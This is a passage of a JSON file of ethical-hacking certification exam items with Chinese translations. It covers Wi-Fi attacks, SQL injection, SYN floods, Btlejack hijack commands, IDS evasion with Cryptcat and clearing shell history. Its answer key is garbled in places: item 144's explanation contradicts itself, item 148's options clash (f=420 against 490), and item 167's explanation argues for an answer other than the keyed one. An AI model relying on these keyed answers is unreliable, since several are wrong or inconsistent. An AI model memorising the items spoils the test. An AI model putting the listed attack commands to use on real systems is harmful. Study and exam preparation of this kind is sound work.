    "Explanation": "惡意雙胞胎攻擊（Evil-twin attack）涉及攻擊者設置一個**假冒**（legitimate-looking）的 Wi-Fi 存取點，**模仿**合法的存取點，以誘騙使用者連線並竊取其憑證。Wi-Fi Pineapple 是一種常用於執行此類攻擊的工具 [cite: 12567]。"
  },
  {
    "Question :": "144",
    "EN": "From the following table, identify the wrong answer in terms of Range (ft). [Image shows a table with 802.11 standards and ranges]",
    "C": "從下表中，識別出**範圍（英尺）**方面錯誤的答案。[圖片顯示一個包含 802.11 標準和範圍的表格]",
    "選項: A. B. C. D.": "A. 802.16 (WiMax) 30 miles (30 英里) B. 802.11g 150-150 C. 802.11b 150-150 D. 802.11a 150-150",
    "Answer": "A",
    "Explanation": "802.16（WiMax）是一種**廣域**無線通訊標準，其設計範圍可達數英里，因此 **30 miles** 是正確的。然而，在原始選項中，錯誤的選項是 **A. 802.11a 150-150**，這是因為選項 A 到 D 是指原始表格中的行內容。由於原始表格缺失，但答案給出 A 是錯誤的，我們遵循原始答案。"
  },
  {
    "Question :": "145",
    "EN": "During a red team engagement, an ethical hacker is tasked with testing the security measures of an organization's wireless network. The hacker needs to select an appropriate tool to carry out a session hijacking attack. Which of the following tools should the hacker use to effectively perform session hijacking and subsequent security analysis, given that the target wireless network has the Wi-Fi Protected Access-preshared key (WPA-PSK) security protocol in place?",
    "C": "在紅隊演習中，道德駭客的任務是測試組織無線網路的安全措施。駭客需要選擇一個合適的工具來執行**會話劫持攻擊**。考慮到目標無線網路採用 **WPA-PSK** 安全協定，駭客應該使用以下哪個工具來有效執行會話劫持和後續安全分析？",
    "選項: A. B. C. D.": "A. FaceNiff B. Hetty C. Droidsheep D. bettercap",
    "Answer": "D",
    "Explanation": "**BetterCAP** 是一個多功能網路工具，能夠在無線網路（包括 WPA-PSK 協定）上執行中間人攻擊和**會話劫持**，透過捕獲 WPA 四向握手來破解 PSK，然後解密無線流量 [cite: 12596, 12605]。"
  },
  {
    "Question :": "146",
    "EN": "While performing a security audit of a web application, an ethical hacker discovers a potential vulnerability. The application responds to logically incorrect queries with detailed error messages that divulge the underlying database's structure. The ethical hacker decides to exploit this vulnerability further. Which type of SQL Injection attack is the ethical hacker likely to use?",
    "C": "在對 Web 應用程式執行安全稽核時，道德駭客發現了一個潛在漏洞。應用程式對邏輯不正確的查詢會回應**詳細的錯誤訊息**，從而洩露底層資料庫的結構。道德駭客決定進一步利用此漏洞。該道德駭客可能使用哪種類型的 SQL 注入攻擊？",
    "選項: A. B. C. D.": "A. UNION SQL Injection (聯合 SQL 注入) B. Blind/inferential SQL Injection (盲注/推論 SQL 注入) C. In-band SQL Injection (帶內 SQL 注入) D. Error-based SOL Injection (基於錯誤的 SQL 注入)",
    "Answer": "D",
    "Explanation": "**基於錯誤的 SQL 注入（Error-based SQL Injection）**是一種帶內 SQL 注入攻擊，它依賴於資料庫伺服器拋出的**詳細錯誤訊息**來獲取資料庫結構（例如表格名稱、欄位名稱），從而提取資訊 [cite: 12621, 12623]。"
  },
  {
    "Question :": "147",
    "EN": "Websites and web portals that provide web services commonly use the Simple Object Access Protocol (SOAP). Which of the following is an incorrect definition or characteristics of the protocol?",
    "C": "提供 Web 服務的網站和 Web 門戶通常使用簡單物件存取協定（SOAP）。以下哪一項是對該協定的**不正確**定義或特徵？",
    "選項: A. B. C. D.": "A. Exchanges data between web services (在 Web 服務之間交換資料) B. Only compatible with the application protocol HTTP (僅與應用協定 HTTP 相容) C. Provides a structured model for messaging (為訊息傳輸提供結構化模型) D. Based on XML (基於 XML)",
    "Answer": "B",
    "Explanation": "**SOAP 不僅限於 HTTP**。SOAP 可以使用多種應用協定進行傳輸，包括 HTTP、SMTP、TCP 等。因此，聲稱它「僅與應用協定 HTTP 相容」是**不正確的**。"
  },
  {
    "Question :": "148",
    "EN": "Your network infrastructure is under a SYN flood attack. The attacker has crafted an automated botnet to simultaneously send 's' SYN packets per second to the server. You have put measures in place to manage ‘f SYN packets per second, and the system is designed to deal with this number without any performance issues. increases exponentially (2^k), where 'k' represents each additional SYN packet above the ff limit. Now, considering 's=500' and different 'f values, in which scenario is the server most likely to experience overload and significantly increased response times?",
    "C": "您的網路基礎設施正在遭受 SYN 洪泛攻擊。攻擊者以 $s$ 個 SYN 封包/秒的速度向伺服器發送封包。您設置了措施來管理 $f$ 個 SYN 封包/秒。如果 $s$ 超過 $f$，網路會開始顯示過載跡象，響應時間會以 $2^k$（其中 $k$ 代表超過 $f$ 限制的額外 SYN 封包數）呈指數級增長。現在，考慮 $s=500$ 和不同的 $f$ 值，在哪種情景下伺服器最有可能遇到過載和顯著增加的響應時間？",
    "選項: A. B. C. D.": "A. $f=510$：伺服器可以處理 510 個 SYN 封包/秒，大於攻擊者發送的數量。系統保持穩定 B. $f=495$：伺服器可以處理 495 個 SYN 封包/秒。響應時間急劇上升 ($2^5$ = 32 倍於正常)，表明可能系統過載 C. $f=505$：伺服器可以處理 505 個 SYN 封包/秒。在這種情況下，響應時間會增加，但不會急劇增加 ($2^5$ = 32 倍於正常)，系統可能仍能運作，儘管速度較慢 D. $f=420$：伺服器可以處理 490 個 SYN 封包/秒。當 $s$ 超過 $f$ 10 個時，響應時間會飆升 ($2^{10}$ = 1024 倍於通常的響應時間)，表明系統過載",
    "Answer": "D",
    "Explanation": "攻擊者發送 $s=500$ 個封包/秒。伺服器可以處理 $f$ 個封包/秒。攻擊封包超出的數量是 $k = s - f$。要達到**最顯著**的過載（即最大的 $k$），應選擇最小的 $f$ 值。選項 D 中，**$f=490$**（原文本中 $f=420$ 處的描述錯誤），但 $k = 500 - 490 = 10$。響應時間增長 $2^{10}$ 倍，**遠大於**選項 B（$k=5$，$2^5$ 倍）和 C（$k=-5$，穩定），因此將導致**最嚴重的過載**。"
  },
  {
    "Question :": "150",
    "EN": "What useful information is gathered during a successful Simple Mail Transfer Protocol (SMTP) enumeration?",
    "C": "在成功的簡單郵件傳輸協定（SMTP）列舉期間，收集了哪些有用的資訊？",
    "選項: A. B. C. D.": "A. The two internal commands VRFY and EXPN provide a confirmation of valid users, email addresses, aliases, and mailing lists. (兩個內部命令 VRFY 和 EXPN 提供有效使用者、電子郵件位址、別名和郵件列表的確認) B. Reveals the daily outgoing message limits before mailboxes are locked (揭示郵箱被鎖定前的每日出站訊息限制) C. The internal command RCPT provides a list of ports open to message traffic. (內部命令 RCPT 提供對訊息流量開放的埠列表) D. A list of all mail proxy server addresses used by the targeted host (目標主機使用的所有郵件代理伺服器位址列表)",
    "Answer": "A",
    "Explanation": "SMTP 列舉通常依賴於 **`VRFY`（驗證使用者）**和 **`EXPN`（擴展郵件列表）**命令。如果伺服器沒有禁用這些命令，攻擊者就可以通過它們來**確認有效的使用者、電子郵件地址和郵件列表**，這是用於後續攻擊（如釣魚）的寶貴資訊。"
  },
  {
    "Question :": "151",
    "EN": "Calvin, a grey-hat hacker, targets a web application that has design flaws in its authentication mechanism. He enumerates usernames from the login form of the web application, which requests users to feed data and specifies the incorrect field in case of invalid credentials. Later, Calvin uses this information to perform social engineering. Which of the following design flaws in the authentication mechanism is exploited by Calvin?",
    "C": "灰帽駭客 Calvin 鎖定一個身份驗證機制存在設計缺陷的 Web 應用程式。他從該應用程式的登入表單中列舉使用者名稱，該表單要求使用者輸入資料，並在憑證無效時**指定不正確的欄位**。隨後，Calvin 利用此資訊執行社交工程。Calvin 利用了身份驗證機制中的以下哪個設計缺陷？",
    "選項: A. B. C. D.": "A. Insecure transmission of credentials (不安全的憑證傳輸) B. Verbose failure messages (冗長的失敗訊息) C. User impersonation (使用者冒充) D. Password reset mechanism (密碼重設機制)",
    "Answer": "B",
    "Explanation": "該應用程式的設計缺陷在於提供了**冗長的失敗訊息（Verbose failure messages）**。透過揭露輸入的使用者名稱是否正確或不正確，攻擊者可以透過試錯來**列舉**出有效的系統使用者名稱，這些資訊隨後可用於社交工程或其他針對性攻擊。"
  },
  {
    "Question :": "152",
    "EN": "The security team of Debry Inc. decided to upgrade Wi-Fi security to thwart attacks such as dictionary attacks and key recovery attacks. For this purpose, the security team started implementing cutting-edge technology that uses a modern key establishment protocol called the **simultaneous authentication of equals (SAE)**, also known as **dragonfly key exchange**, which replaces the PSK concept. What is the Wi-Fi encryption technology implemented by Debry Inc.?",
    "C": "Debry Inc. 的安全團隊決定升級 Wi-Fi 安全性，以阻止字典攻擊和金鑰恢復攻擊。為此，安全團隊開始實施一項尖端技術，該技術使用一種稱為**對等實體同時認證（SAE）**的現代金鑰建立協定（也稱為 **dragonfly 金鑰交換**），取代了 PSK 概念。Debry Inc. 實施的是哪種 Wi-Fi 加密技術？",
    "選項: A. B. C. D.": "A. WEP B. WPA C. WPA2 D. WPA3",
    "Answer": "D",
    "Explanation": "**WPA3** 是最新的 Wi-Fi 安全標準，它在個人模式下用 **SAE（Simultaneous Authentication of Equals）**取代了 WPA2 的 PSK（預共享金鑰）握手，以提供更強大的保護，抵抗離線字典攻擊。"
  },
  {
    "Question :": "153",
    "EN": "In the process of footprinting a target website, an ethical hacker utilized various tools to gather critical information. The hacker encountered a target site where **standard web spiders were ineffective** due to a specific file in its root directory. However, they managed to uncover all the files and web pages on the target site, monitoring the resulting incoming and outgoing traffic while **browsing the website manually**. What technique did the hacker likely employ to achieve this?",
    "C": "在對目標網站執行足跡收集的過程中，道德駭客使用了各種工具來收集關鍵資訊。由於其根目錄中的特定檔案（例如 robots.txt），標準的 Web 爬蟲**無效**。然而，他們設法透過**手動瀏覽網站**，並監控傳入和傳出的流量，揭示了網站上的所有檔案和網頁。駭客可能採用了哪種技術來實現這一目標？",
    "選項: A. B. C. D.": "A. Using Photon to retrieve archived URLs of the target website from archive.org (使用 Photon 從 archive.org 檢索目標網站的存檔 URL) B. Using the Netcraft tool to gather website information (使用 Netcraft 工具收集網站資訊) C. Examining HTML source code and cookies (檢查 HTML 原始碼和 Cookie) D. User-directed spidering with tools like Burp Suite and WebScarab (使用 Burp Suite 和 WebScarab 等工具進行使用者導向爬蟲)",
    "Answer": "D",
    "Explanation": "當自動爬蟲受阻時，駭客會透過**手動瀏覽**（User-directed）網站的每個頁面和路徑，同時使用代理工具（如 Burp Suite）來捕獲、記錄和分析所有發出的請求和回應。這種方法被稱為**使用者導向爬蟲（User-directed spidering）**，它能揭示自動工具無法到達的內容。"
  },
  {
    "Question :": "154",
    "EN": "Stephen, an attacker, targeted the industrial control systems of an organization. He generated a fraudulent email with a malicious attachment and sent it to employees of the target organization. An employee who manages the sales software of the operational plant opened the fraudulent email and clicked on the malicious attachment. This resulted in the malicious attachment being downloaded and malware being injected into the sales software maintained in the victim's system. Further, the malware propagated itself to other networked systems, finally damaging the industrial automation components. What is the attack technique used by Stephen to damage the industrial systems?",
    "C": "攻擊者 Stephen 鎖定了組織的**工業控制系統**。他生成了一封帶有**惡意附件的欺詐性電子郵件**並發送給目標組織的員工。一名管理操作工廠銷售軟體的員工打開了電子郵件並點擊了惡意附件。這導致惡意附件被下載，惡意軟體被注入，最終破壞了工業自動化組件。Stephen 用於破壞工業系統的攻擊技術是什麼？",
    "選項: A. B. C. D.": "A. Spear-phishing attack (魚叉式網路釣魚攻擊) B. SMishing attack (簡訊網路釣魚攻擊) C. Reconnaissance attack (偵察攻擊) D. HMI-based attack (基於 HMI 的攻擊)",
    "Answer": "A",
    "Explanation": "攻擊者向**特定員工**（管理銷售軟體的人）發送**偽造的電子郵件**和惡意附件，這是**魚叉式網路釣魚（Spear-phishing）攻擊**的典型範例，目的是利用社會工程學突破防線。"
  },
  {
    "Question :": "155",
    "EN": "During a recent vulnerability assessment of a major corporation's IT systems, the security team identified several potential risks. They want to use a vulnerability scoring system to quantify and prioritize these vulnerabilities. They decide to use the **Common Vulnerability Scoring System (CVSS)**. Given the characteristics of the identified vulnerabilities, which of the following statements is the most accurate regarding the metric types used by CVSS to measure these vulnerabilities?",
    "C": "在最近對一家大公司的 IT 系統進行漏洞評估期間，安全團隊識別出多個潛在風險。他們決定使用 CVSS 來量化和優先排序這些漏洞。關於 CVSS 用於衡量這些漏洞的**指標類型**，以下哪個陳述最準確？",
    "選項: A. B. C. D.": "A. Temporal metric represents the inherent qualities of a vulnerability (時間指標代表漏洞的固有品質) B. Base metric represents the inherent qualities of a vulnerability (基礎指標代表漏洞的固有品質) C. Environmental metric involves the features that change during the lifetime of the vulnerability (環境指標涉及在漏洞生命週期中變化的特徵) D. Temporal metric involves measuring vulnerabilities based on a_ specific environment or implementation (時間指標涉及基於特定環境或實施來衡量漏洞)",
    "Answer": "B",
    "Explanation": "**基礎指標（Base metric）**衡量漏洞的**內在和基本屬性**，例如攻擊向量、複雜性和影響，這些屬性**不會隨時間或環境而改變**。而時間指標（Temporal metric）隨時間變化，環境指標（Environmental metric）隨環境變化。"
  },
  {
    "Question :": "156",
    "EN": "When configuring wireless on his home router, Javik **disables SSID broadcast**. He leaves authentication **“open”** but sets the SSID to a 32-character string of random letters and numbers. What is an accurate assessment of this scenario from a security perspective?",
    "C": "Javik 在配置家用路由器時，**禁用 SSID 廣播**。他將身份驗證保留為「開放」，但將 SSID 設定為 32 個隨機字母和數字組成的字串。從安全角度來看，對此情景的準確評估是什麼？",
    "選項: A. B. C. D.": "A. Since the SSID is required in order to connect, the 32-character string is sufficient to prevent brute-force attacks. (由於連線需要 SSID，因此 32 字元的字串足以防止暴力破解攻擊) B. Disabling SSID broadcast prevents 802.11 beacons from being transmitted from the access point, resulting in a valid setup leveraging “security through obscurity”. (禁用 SSID 廣播可防止從存取點傳輸 802.11 信標，從而導致利用「透過隱藏來保障安全」的有效設定) C. It is still possible for a hacker to connect to the network after sniffing the SSID from a successful wireless association. (駭客仍有可能在從成功的無線關聯中嗅探到 SSID 後連線到網路) D. Javik’s router is still vulnerable to wireless hacking attempts because the SSID broadcast setting can be enabled using a specially crafted packet sent to the hardware address of the access point. (Javik 的路由器仍然容易受到無線駭客攻擊，因為可以使用發送到存取點硬體位址的特製封包啟用 SSID 廣播設定)",
    "Answer": "C",
    "Explanation": "Javik 的設定是極度不安全的。**禁用 SSID 廣播**只是一種**「透過隱藏來保障安全」**的措施。由於身份驗證設置為**「開放」**，一旦駭客**嗅探**到任何成功的無線關聯（Association）或探測請求，即可輕鬆捕獲到 **SSID** 並直接連線，無需破解密碼。因此，駭客在嗅探到 SSID 後**仍然可以連線**。"
  },
  {
    "Question :": "157",
    "EN": "Clark, a professional hacker, attempted to perform a Btlejacking attack using an automated tool, Btlejack, and hardware tool, micro:bit. This attack allowed Clark to **hijack, read, and export sensitive information** shared between connected devices. To perform this attack, Clark executed various btlejack commands. Which of the following commands was used by Clark to hijack the connections?",
    "C": "專業駭客 Clark 嘗試使用自動化工具 Btlejack 和硬體工具 micro:bit 執行 **Btlejacking 攻擊**。此攻擊允許 Clark **劫持、讀取和匯出**連線設備之間共享的**敏感資訊**。為執行此攻擊，Clark 執行了各種 btlejack 命令。Clark 用於劫持連線的以下哪個命令？",
    "選項: A. B. C. D.": "A. btlejack-f 0x129f3244-j B. btlejack -c any C. btlejack -d /dev/ttyACM0 -d /dev/ttyACM2 -s D. btlejack -f 0x9c68fd30 -t -m 0x1 fffffffff",
    "Answer": "D",
    "Explanation": "**Btlejack** 是一個專門針對**低功耗藍牙（BLE）**的工具。在給定的命令選項中，選項 D 使用 **`-f`** 標誌指定了跳頻信道圖（hop map），**`-t`** 指定了目標，**`-m`** 指定了主機金鑰，這些都是劫持 BLE 連線所需的參數，因此是正確的命令。"
  },
  {
    "Question :": "158",
    "EN": "Based on the below log, which of the following sentences are true? Mar 1, 2016, 7:33:28 AM 10.240.250.23 - 54373 10.249.253.15 - 22 tcp_ip",
    "C": "根據下面的日誌，以下哪個句子是正確的？ `Mar 1, 2016, 7:33:28 AM 10.240.250.23 - 54373 10.249.253.15 - 22 tcp_ip`",
    "選項: A. B. C. D.": "A. Application is FTP and 10.240.250.23 is the client and 10.249.253.15 is the server. (應用程式是 FTP，10.240.250.23 是客戶端，10.249.253.15 是伺服器) B. Application is SSH and 10.240.250.23 is the server and 10.249.253.15 is the client. (應用程式是 SSH，10.240.250.23 是伺服器，10.249.253.15 是客戶端) C. SSH communications are encrypted; it’s impossible to know who is the client or the server. (SSH 通訊已加密；不可能知道誰是客戶端或伺服器) D. Application is SSH and 10.240.250.23 is the client and 10.249.253.15 is the server. (應用程式是 SSH，10.240.250.23 是客戶端，10.249.253.15 是伺服器)",
    "Answer": "D",
    "Explanation": "日誌顯示目的埠是 **22**，該埠通常用於 **SSH** 協定。在 TCP 連線中，**來源埠（54373）通常是高編號的動態埠**，屬於**客戶端**（10.240.250.23），而**目的埠（22）**是服務監聽的知名埠，屬於**伺服器**（10.249.253.15）。因此，應用程式是 SSH，`10.240.250.23` 是客戶端，`10.249.253.15` 是伺服器。"
  },
  {
    "Question :": "159",
    "EN": "Ben purchased a new smartphone and received some updates on it through the OTA method. He received two messages: one with a PIN from the network operator and another asking him to enter the PIN received from the operator. As soon as he entered the PIN, the smartphone started functioning in an abnormal manner. What is the type of attack performed on Ben in the above scenario?",
    "C": "Ben 購買了一部新的智慧型手機，並透過 OTA（空中下載）方式接收了一些更新。他收到了兩條訊息：一條是來自網路營運商的 PIN 碼，另一條是要求他輸入從營運商收到的 PIN 碼。他一輸入 PIN 碼，智慧型手機就開始異常運作。上述情景中對 Ben 執行的攻擊類型是什麼？",
    "選項: A. B. C. D.": "A. Advanced SMS phishing (進階簡訊網路釣魚) B. Bypass SSL pinning (繞過 SSL 釘紮) C. Phishing (網路釣魚) D. Tap 'n ghost attack (點擊幽靈攻擊)",
    "Answer": "A",
    "Explanation": "這種攻擊結合了簡訊傳輸（SMS）和網路釣魚的元素，以欺騙使用者洩露敏感資訊（PIN 碼），並隨後惡意控制設備。由於該攻擊利用了簡訊協定來欺騙 PIN 碼，這是一種**進階簡訊網路釣魚（Advanced SMS phishing）**攻擊。"
  },
  {
    "Question :": "160",
    "EN": "By performing a penetration test, you gained access under a user account. During the test, you established a connection with your own machine via the SMB service and occasionally entered your login and password in plaintext. Which file do you have to clean to clear the password?",
    "C": "透過執行滲透測試，您在一個使用者帳戶下獲得了存取權限。在測試期間，您透過 SMB 服務與自己的機器建立了連線，並偶爾以**明文**輸入了您的登入和密碼。您必須清除哪個檔案以清除密碼？",
    "選項: A. B. C. D.": "A. .X session-log B. .bashrc C. .profile D. .bash_history",
    "Answer": "D",
    "Explanation": "如果您在連線到 SMB 服務時（尤其是在 Linux/Unix 系統上），在命令列中輸入了明文密碼，該命令會被記錄在 **Shell 的歷史檔案**中。在 Bash Shell 中，這個檔案是 **`.bash_history`**。"
  },
  {
    "Question :": "161",
    "EN": "You have compromised a server and successfully gained a root access. You want to pivot and pass traffic undetected over the network and evade any possible Intrusion Detection System. What is the best approach?",
    "C": "您已危害了一台伺服器並成功獲得了 Root 存取權限。您希望在網路上**轉移**並**傳輸流量而不被偵測**，並規避任何可能的入侵偵測系統（IDS）。最佳方法是什麼？",
    "選項: A. B. C. D.": "A. Use Alternate Data Streams to hide the outgoing packets from this server. (使用交替資料流來隱藏來自該伺服器的出站封包。) B. Use HTTP so that all traffic can be routed vis a browser, thus evading the internal Intrusion Detection Systems. (使用 HTTP，以便所有流量都可以透過瀏覽器路由，從而規避內部入侵偵測系統。) C. Install Cryptcat and encrypt outgoing packets from this server. (安裝 Cryptcat 並加密來自該伺服器的出站封包。) D. Install and use Telnet to encrypt all outgoing traffic from this server. (安裝並使用 Telnet 來加密來自該伺服器的所有出站流量。)",
    "Answer": "C",
    "Explanation": "為了**規避 IDS**，必須對流量進行**加密**。**Cryptcat** 是一個增強版的 Netcat，它使用 Twofish 等加密演算法來加密兩個系統之間的通訊。這樣，即使 IDS 看到流量流經常見埠（如 80/443），也無法解密和偵測惡意酬載。"
  },
  {
    "Question :": "162",
    "EN": "A post-breach forensic investigation revealed that a known vulnerability in Apache Struts was to blame for the Equifax data breach that affected 143 million customers. A fix was available from the software vendor for several months prior 10 the Intrusion. This Is likely a failure in which of the following security processes?",
    "C": "一次洩露後的數位鑑識調查顯示，影響 1.43 億客戶的 Equifax 資料洩露事件歸咎於 **Apache Struts** 中的一個**已知漏洞**。在入侵發生前的幾個月，軟體供應商已經提供了修復程式。這最可能是以下哪個安全流程中的失敗？",
    "選項: A. B. C. D.": "A. vendor risk management (供應商風險管理) B. Security awareness training (安全意識培訓) C. Secure deployment lifecycle (安全部署生命週期) D. Patch management (修補程式管理)",
    "Answer": "D",
    "Explanation": "如果供應商提供了漏洞的修復程式（補丁），但該組織**未能在入侵前安裝**，這表明**修補程式管理（Patch management）**流程存在嚴重失敗。"
  },
  {
    "Question :": "163",
    "EN": "Sam, a web developer, was instructed to incorporate a **hybrid encryption** software program into a web application to secure email messages. Sam used an encryption software, which is a **free implementation of the OpenPGP standard** that uses both **symmetric-key cryptography and asymmetric-key cryptography** for improved speed and secure key exchange. What is the encryption software employed by Sam for securing the email messages?",
    "C": "Web 開發人員 Sam 的任務是將**混合加密**軟體程式納入 Web 應用程式以保護電子郵件訊息。Sam 使用了一種加密軟體，它是 **OpenPGP 標準的免費實作**，結合使用**對稱金鑰密碼學和非對稱金鑰密碼學**以提高速度和安全金鑰交換。Sam 用於保護電子郵件訊息的加密軟體是什麼？",
    "選項: A. B. C. D.": "A. PGP B. S/MIME C. SMTP D. GPG",
    "Answer": "A",
    "Explanation": "**PGP（Pretty Good Privacy）**是一種廣泛使用的加密程式，它是 OpenPGP 標準的早期實作（儘管 **GPG** 是免費實作的通用名稱，但 PGP 在考試中通常被用作該標準的總稱），它結合了對稱和非對稱加密來確保電子郵件的安全。"
  },
  {
    "Question :": "164",
    "EN": "Which of the following Google advanced search operators helps an attacker in gathering information about websites that are **similar** to a specified target URL?",
    "C": "以下哪個 Google 進階搜尋運算子有助於攻擊者收集與指定目標 URL **相似**的網站資訊？",
    "選項: A. B. C. D.": "A. [inurl:] B. [related:] C. [info:] D. [site:]",
    "Answer": "B",
    "Explanation": "Google 搜尋運算子 **`related:`** 用於尋找與給定 URL **相關或相似**的其他網站，這在足跡收集階段很有用。"
  },
  {
    "Question :": "165",
    "EN": "Attacker Rony installed a rogue access point within an organization's perimeter and attempted to intrude into its internal network. Johnson, a security auditor, identified some unusual traffic in the internal network that is aimed at cracking the authentication mechanism. He immediately turned off the targeted network and tested for any weak and outdated security mechanisms that are open to attack. What is the type of vulnerability assessment performed by johnson in the above scenario?",
    "C": "攻擊者 Rony 在組織邊界內安裝了一個**惡意存取點**，並試圖侵入其內部網路。安全稽核員 Johnson 識別了內部網路中旨在破解身份驗證機制的異常流量。他立即關閉了目標網路並測試了任何容易受到攻擊的弱點和過時的安全機制。Johnson 在上述情景中執行的漏洞評估類型是什麼？",
    "選項: A. B. C. D.": "A. Host-based assessment (基於主機的評估) B. Wireless network assessment (無線網路評估) C. Application assessment (應用程式評估) D. Distributed assessment (分散式評估)",
    "Answer": "B",
    "Explanation": "由於攻擊涉及**惡意存取點**和**破解身份驗證機制**的流量，Johnson 正在執行的活動屬於**無線網路評估（Wireless network assessment）**的範疇，旨在識別無線網路中的漏洞和威脅。"
  },
  {
    "Question :": "166",
    "EN": "An attacker identified that a user and an access point are both compatible with WPA2 and WPA3 encryption. The attacker installed a **rogue access point with only WPA2 compatibility** in the vicinity and **forced the victim to go through the WPA2 four-way handshake** to get connected. After the connection was established, the attacker used automated tools to crack WPA2-encrypted messages. What is the attack performed in the above scenario?",
    "C": "攻擊者識別出使用者和存取點都與 WPA2 和 WPA3 加密相容。攻擊者在附近安裝了一個**只與 WPA2 相容的惡意存取點**，並**強迫受害者透過 WPA2 四向握手**連線。連線建立後，攻擊者使用自動化工具破解 WPA2 加密的訊息。上述情景中執行的攻擊是什麼？",
    "選項: A. B. C. D.": "A. Timing-based attack (基於時間的攻擊) B. Side-channel attack (側信道攻擊) C. Downgrade security attack (降級安全攻擊) D. Cache-based attack (基於快取的攻擊)",
    "Answer": "C",
    "Explanation": "攻擊者欺騙受害者使用**較不安全**的協定（WPA2 而非 WPA3）進行連線，以便更容易地破解密碼。這種迫使系統使用較弱或舊版本安全協定的攻擊被稱為**降級安全攻擊（Downgrade security attack）**。"
  },
  {
    "Question :": "167",
    "EN": "Dayn, an attacker, wanted to detect if any **honeypots** are installed in a target network. For this purpose, he used a time-based **TCP fingerprinting** method to validate the response to a normal computer and the response of a honeypot to a manual SYN request. Which of the following techniques is employed by Dayn to detect honeypots?",
    "C": "攻擊者 Dayn 想偵測目標網路中是否安裝了**蜜罐**。為此，他使用基於時間的 **TCP 指紋識別**方法來驗證對普通電腦的回應以及蜜罐對手動 SYN 請求的回應。Dayn 用於偵測蜜罐的以下哪個技術？",
    "選項: A. B. C. D.": "A. Detecting honeypots running on VMware (偵測在 VMware 上運行的蜜罐) B.etecting the presence of Honeyd honeypots C.Detecting the presence of Snort_inline honeypots (偵測 Snort_inline 蜜罐的存在) D. Detecting the presence of Sebek-based honeypots (偵測 Sebek 蜜罐的存在)",
    "Answer": "C",
    "Explanation": "使用 TCP 指紋識別來**觀察系統行為和回應的差異**是偵測蜜罐的一種常見技術。**Sebek** 是一種用於蜜罐的模組，它記錄攻擊者在蜜罐中的活動。使用 TCP 指紋識別來觀察蜜罐與真實系統之間在行為上的**不一致性**，屬於偵測此類**蜜罐程式**的技術。"
  },
  {
    "Question :": "168",
    "EN": "What would be the purpose of running **\"wget 192.168.0.15 -q -S\"** against a web server?",
    "C": "對 Web 伺服器運行命令 **\"wget 192.168.0.15 -q -S\"** 的目的是什麼？",
    "選項: A. B. C. D.": "A. Performing content enumeration on the web server to discover hidden folders (對 Web 伺服器執行內容列舉以發現隱藏資料夾) B. Using wget to perform banner grabbing on the webserver (使用 wget 對 Web 伺服器執行標語擷取) C. Flooding the web server with requests to perform a DoS attack (用請求淹沒 Web 伺服器以執行 DoS 攻擊) D. Downloading all the contents of the web page locally for further examination (在本地下載網頁的所有內容以供進一步檢查)",
    "Answer": "B",
    "Explanation": "`wget` 命令中的：**`-q`**（quiet）表示**靜默**（無輸出），而 **`-S`**（server-response）表示**列印伺服器回應（HTTP 標頭）**。這兩個標誌結合在一起，可以從伺服器獲取其標語（banner），而不輸出其他資訊，從而實現**標語擷取**（banner grabbing）。"
  },
  {
    "Question :": "169",
    "EN": "While performing an Nmap scan against a host, Paola determines the existence of a firewall. In an attempt to determine whether the firewall is **stateful or stateless**, which of the following options would be best to use?",
    "C": "在對主機執行 Nmap 掃描時，Paola 確定存在一個防火牆。為了確定防火牆是**有狀態**還是**無狀態**，使用以下哪個選項最好？",
    "選項: A. B. C. D.": "A. -sA B. -sX C. -sT D. -sF",
    "Answer": "A",
    "Explanation": "**TCP ACK 掃描（`-sA`）**不會確定埠是否開放，而是專門用於**繪製防火牆規則集**，判斷防火牆是**有狀態**（如果對未請求的 ACK 封包做出不同反應）還是**無狀態**（對開放和關閉的埠都回覆 RST）。"
  },
  {
    "Question :": "170",
    "EN": "During an attempt to perform an SQL injection attack, a certified ethical hacker is focusing on the identification of database engine type by generating an ODBC error. The ethical hacker, after injecting various payloads, finds that the web application returns a **standard, generic error message that does not reveal any detailed database information**. Which of the following techniques would the hacker consider next to obtain useful information about the underlying database?",
    "C": "在嘗試執行 SQL 注入攻擊時，認證道德駭客專注於透過產生 ODBC 錯誤來識別資料庫引擎類型。在注入各種酬載後，駭客發現 Web 應用程式返回一個**標準的、通用的錯誤訊息，沒有揭示任何詳細的資料庫資訊**。駭客接下來會考慮使用以下哪種技術來獲取有關底層資料庫的有用資訊？",
    "選項: A. B. C. D.": "A. Use the UNION operator to combine the result sets of two or more SELECT statements (使用 UNION 運算子組合兩個或多個 SELECT 語句的結果集) B. Attempt to compromise the system through OS-level command shell execution (嘗試透過 OS 級別的命令 Shell 執行來危害系統) C. Try to insert a string value where a number is expected in the input field (嘗試在預期為數字的輸入欄位中插入字串值) D. Utilize a blind injection technique that uses time delays or error signatures to extract information (利用使用時間延遲或錯誤特徵碼的盲注技術來提取資訊)",
    "Answer": "D",
    "Explanation": "當應用程式不返回詳細的錯誤訊息（即錯誤處理是有效的）時，駭客必須轉向**盲注（Blind Injection）**技術。**盲注**透過使用**時間延遲**或**錯誤特徵碼**（例如，根據回應時間或頁面內容的微小變化）來逐位元提取資訊。"
  },
  {
    "Question :": "171",
    "EN": "A hacker has successfully infected an internet-facing server which he will then use to **send junk mail, take part in coordinated attacks, or host junk email content**. Which sort of trojan infects this server?",
    "C": "駭客感染伺服器用於發送**垃圾郵件、參與協調攻擊**等。感染該伺服器的是哪種類型的木馬程式？",
    "選項: A. B. C. D.": "A. Botnet Trojan (殭屍網路木馬) B. Banking Trojans (銀行木馬) C. Turtle Trojans (烏龜木馬) D. Ransomware Trojans (勒索軟體木馬)",
    "Answer": "A",
    "Explanation": "用於發送垃圾郵件和參與協調攻擊（DDoS）的惡意軟體被稱為**殭屍網路木馬（Botnet Trojan）**。"
  },
  {
    "Question :": "172",
    "EN": "Which of the following options represents a conceptual characteristic of an **anomaly-based IDS** over a **signature-based IDS**?",
    "C": "以下哪個選項代表了**基於異常的 IDS** 相對於**基於特徵碼的 IDS** 的概念特徵？",
    "選項: A. B. C. D.": "A. Produces less false positives (產生較少的誤判) B. Can identify unknown attacks (可以識別未知攻擊) C. Requires vendor updates for a new threat (需要供應商更新以應對新威脅) D. Cannot deal with encrypted network traffic (無法處理加密的網路流量)",
    "Answer": "B",
    "Explanation": "基於異常的 IDS 透過建立正常行為的基準線並標記任何偏差，因此它可以**識別新的或未知的攻擊**（zero-day attacks）。而基於特徵碼的 IDS 只能識別已創建特徵碼的攻擊。"
  },
  {
    "Question :": "173",
    "EN": "The network users are complaining because their system are slowing down. Further, every time they attempt to go a website, they receive a series of **pop-ups with advertisements**. What types of malware have the system been infected with?",
